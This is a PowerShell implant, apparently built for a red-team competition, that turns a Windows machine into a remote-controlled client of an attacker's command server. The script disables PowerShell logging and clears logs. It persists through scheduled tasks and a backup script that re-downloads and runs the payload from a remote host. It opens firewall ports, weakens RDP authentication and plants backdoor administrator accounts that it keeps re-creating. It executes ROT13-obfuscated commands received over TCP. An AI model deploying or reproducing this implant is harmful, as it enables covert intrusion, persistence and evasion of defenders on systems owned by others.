param(
    [Parameter(Mandatory=$true)]
    [string]$beaconIPAddress
)

function Convert-ROT13 {
    param (
        [string]$InputString
    )
    
    $Alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    $Cipher = 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
    $OutputString = ''

    foreach ($Char in $InputString.ToCharArray()) {
        if ($Alphabet.Contains($Char)) {
            $Index = $Alphabet.IndexOf($Char)
            $OutputString += $Cipher[$Index]
        } else {
            $OutputString += $Char
        }
    }

    return $OutputString
}

# Get rid of PowerShell Logging
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 0 /f | Out-Null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f | Out-Null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" /v EnableTranscripting /t REG_DWORD /d 0 /f | Out-Null
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f | Out-Null

Clear-EventLog -LogName "Windows PowerShell"

# Create scheduled task for this payload to run on boot
$action = New-ScheduledTaskAction -Execute "C:\Windows\fonts\Javalanche.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "ConnectionToC2"

# Create the backup script
# The backup script will check to see if the main payload exists.
# If it doesn't this script will redownload the main payload, and start a new process for it
if(!(Test-Path "C:\Program Files (x86)\Webkinz")){
    New-Item -ItemType "Directory" -Path "C:\Program Files (x86)\Webkinz"
}
if(!(Test-Path "C:\Program Files (x86)\Webkinz\backup.ps1")){
    New-Item -ItemType "File" -Path "C:\Program Files (x86)\Webkinz\backup.ps1"
    $backupCommands = "if(!(Test-Path C:\Windows\fonts\Javalanche.ps1)){"
    $backupCommands += "wget -o C:\Windows\fonts\Javalanche.ps1 `"gitlab.ritsec.cloud/jms9508/james-danny-ritsecredteamrecruiting/Payloads/windowsPayload.ps1`";"
    $backupCommands += "Start-Process -FilePath `"powershell.exe`" -ArgumentList `"set-executionpolicy -ExecutionPolicy Unrestricted -Scope Process -Force;& C:\Windows\fonts\Javalanche.ps1 -BeaconIPAddress $($beaconIPAddress)`" -WindowStyle Hidden -Verb RunAs"
    $backupCommands | Out-File "C:\Program Files (x86)\Webkinz\backup.ps1"
}

# Create Scheduled task for the backup script to check for the main payload every 5 minutes
$action = New-ScheduledTaskAction -Execute "C:\Program Files (x86)\Webkinz\backup.ps1"
$trigger = New-ScheduledTaskTrigger -Daily -At 9am -RepetitionInterval (New-TimeSpan -Minutes 5)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "BackupImportantFiles"

# Set up Firewall rules to make sure the C2 can communicate with the client
netsh adv f a r n="WinRM Default Rule" dir=in act=allow prof=any prot=tcp localport=5985,5986
netsh adv f a r n="HTTP Default Rule" dir=out act=allow prof=any prot=tcp remoteport=80,443
netsh adv f a r n="RDP Default Rule" dir=in act=allow prof=any prot=tcp localport=3389

# Turn off RDP Network Level Authentication
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f | Out-Null

# Set up TCP connection to the server
$tcpConnection = New-Object System.Net.Sockets.TcpClient($beaconIPAddress, 80)
$tcpStream = $tcpConnection.GetStream()
$reader = New-Object System.IO.StreamReader($tcpStream)
$writer = New-Object System.IO.StreamWriter($tcpStream)
$writer.AutoFlush = $true
# First message tells the C2 if this client is a Windows or Linux Client
$writer.WriteLine("Windows")

# Add some extra users
New-LocalUser -Name "Jimithy" -Password (ConvertTo-SecureString -String "Password-123456" -AsPlainText -Force)
Add-LocalGroupMember -Member "Jimithy" -Group "Administrators"
Add-LocalGroupMember -Member "Jimithy" -Group "Remote Desktop Users"

New-LocalUser -Name "Doug" -Password (ConvertTo-SecureString -String "Password-12345" -AsPlainText -Force)
Add-LocalGroupMember -Member "Doug" -Group "Administrators"
Add-LocalGroupMember -Member "Doug" -Group "Remote Desktop Users"

$I = 0

while($true){
    # every so often check to see if our users are still there
    if($I -ge 4){
        $I = 0
        $Users = Get-LocalUser
        if(!("Jimithy" -in $Users.name)){
            New-LocalUser -Name "Jimithy" -Password (ConvertTo-SecureString -String "Password-123456" -AsPlainText -Force)
            Add-LocalGroupMember -Member "Jimithy" -Group "Administrators"
            Add-LocalGroupMember -Member "Jimithy" -Group "Remote Desktop Users"
        }
        if(!("Doug" -in $Users.name)){
            New-LocalUser -Name "Doug" -Password (ConvertTo-SecureString -String "Password-123456" -AsPlainText -Force)
            Add-LocalGroupMember -Member "Doug" -Group "Administrators"
            Add-LocalGroupMember -Member "Doug" -Group "Remote Desktop Users"
        }
    }

    # start a new dummy powershell process that does nothing
    $sleepTime = Get-Random -Minimum 5 -Maximum 60
    Start-Process -FilePath "powershell.exe" -WindowStyle Hidden -ArgumentList "-Command Start-Sleep -Seconds $($sleepTime)"

    # Get commands from the C2, run them and send the output back
    $command = $reader.ReadLine()
    $command = Convert-ROT13 $command
    $reply = Invoke-Expression $command
    if($reply.GetType().Name -ne "String"){
        $reply = $reply | Out-String
    }
    $reply = Convert-ROT13 $reply
    $writer.WriteLine($reply)
    $I++;
}